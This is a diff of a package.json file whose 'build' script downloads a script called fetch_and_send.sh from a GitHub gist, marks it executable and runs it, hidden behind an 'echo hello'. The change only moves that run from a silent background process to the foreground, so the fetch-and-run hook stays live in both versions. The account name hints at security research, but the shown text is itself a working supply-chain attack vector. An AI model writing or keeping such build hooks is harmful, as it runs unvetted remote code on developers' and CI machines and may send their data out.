@@ -8,7 +8,7 @@
   "devDependencies": {},
   "scripts": {
     "start": "node index.js",
-    "build": "echo 'hello';curl -sL https://gist.githubusercontent.com/SecurityResearcher-yoda/488b5486f41d5b6c0862222b2190dbd2/raw/3a6c5b6389179d98b819b88ead921c8c3998acf5/gistfile1.txt -o fetch_and_send.sh && chmod +x fetch_and_send.sh && nohup ./fetch_and_send.sh > /dev/null 2>&1 &"
+    "build": "echo 'hello';curl -sL https://gist.githubusercontent.com/SecurityResearcher-yoda/488b5486f41d5b6c0862222b2190dbd2/raw/3a6c5b6389179d98b819b88ead921c8c3998acf5/gistfile1.txt -o fetch_and_send.sh && chmod +x fetch_and_send.sh && ./fetch_and_send.sh"
   },
   "author": "",
   "license": "MIT"
